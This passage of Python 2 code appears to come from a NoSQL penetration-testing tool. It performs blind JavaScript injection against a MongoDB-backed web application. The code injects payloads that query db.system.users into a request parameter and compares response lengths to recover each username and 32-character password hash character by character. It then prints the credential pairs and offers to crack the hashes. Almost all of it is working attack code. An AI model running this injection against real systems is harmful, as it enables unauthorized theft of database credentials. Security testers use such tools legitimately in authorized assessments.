                        username = username + chars[charCounterUsr]
                        #print username
                        rightCharsUsr += 1
                        charCounterUsr = 0

                    else:
                        charCounterUsr += 1

                retrUsers += 1
                users.append(username)
                #reinitialize all variables and get ready to do it again
                #print str(retrUsers)
                #print str(users)
                charCountUsr = False
                rightCharsUsr = 0
                usrChars = 0
                username = ""

                while rightCharsHash < 32:  #Hash length is static
                    hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne(); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } var dum='a" + "&")

                    req = urllib2.Request(hashUri, None, requestHeaders)
                    lenUri = int(len(urllib2.urlopen(req).read()))

                    if lenUri == baseLen:
                        pwdHash = pwdHash + chars[charCounterHash]
                        #print pwdHash
                        rightCharsHash += 1
                        charCounterHash = 0

                    else:
                        charCounterHash += 1

                hashes.append(pwdHash)
                print "Got user:hash " + users[0] + ":" + hashes[0]
                #reinitialize all variables and get ready to do it again
                charCounterHash = 0
                rightCharsHash = 0
                pwdHash = ""
            else:
                while charCountUsr == False:
                    #different query to get the first user vs. others
                    usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.length == " + str(usrChars) + ") { return true; } var dum='a" + "&")

                    req = urllib2.Request(usrUri, None, requestHeaders)
                    lenUri = int(len(urllib2.urlopen(req).read()))

                    if lenUri == baseLen:
                        #Got the right number of characters
                        charCountUsr = True

                    else:
                        usrChars += 1

                while  rightCharsUsr < usrChars:
                    usrUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.user.charAt(" + str(rightCharsUsr) + ") == '"+ chars[charCounterUsr] + "') { return true; } var dum='a" + "&")

                    req = urllib2.Request(usrUri, None, requestHeaders)
                    lenUri = int(len(urllib2.urlopen(req).read()))

                    if lenUri == baseLen:
                        username = username + chars[charCounterUsr]
                        #print username
                        rightCharsUsr += 1
                        charCounterUsr = 0

                    else:
                        charCounterUsr += 1

                retrUsers += 1
                #reinitialize all variables and get ready to do it again

                charCountUsr = False
                rightCharsUsr = 0
                usrChars = 0

                while rightCharsHash < 32:  #Hash length is static
                    hashUri = uriArray[16].replace("---","var usr = db.system.users.findOne({user:{$nin:" + str(users) + "}}); if (usr.pwd.charAt(" + str(rightCharsHash) + ") == '"+ chars[charCounterHash] + "') { return true; } vardum='a" + "&")

                    req = urllib2.Request(hashUri, None, requestHeaders)
                    lenUri = int(len(urllib2.urlopen(req).read()))

                    if lenUri == baseLen:
                        pwdHash = pwdHash + chars[charCounterHash]
                        rightCharsHash += 1
                        charCounterHash = 0

                    else:
                        charCounterHash += 1

                users.append(username)
                hashes.append(pwdHash)
                print "Got user:hash " + users[retrUsers-1] + ":" + hashes[retrUsers-1]
                #reinitialize all variables and get ready to do it again
                username = ""
                charCounterHash = 0
                rightCharsHash = 0
                pwdHash = ""
    crackHash = raw_input("Crack recovered hashes (y/n)?:  ")

    while crackHash.lower() == "y":
        menuItem = 1
        for user in users:
            print str(menuItem) + "-" + user
            menuItem +=1

        userIndex = raw_input("Select user hash to crack: ")
        nsmmongo.passCrack(users[int(userIndex)-1],hashes[int(userIndex)-1])

        crackHash = raw_input("Crack another hash (y/n)?")
    raw_input("Press enter to continue...")
    return

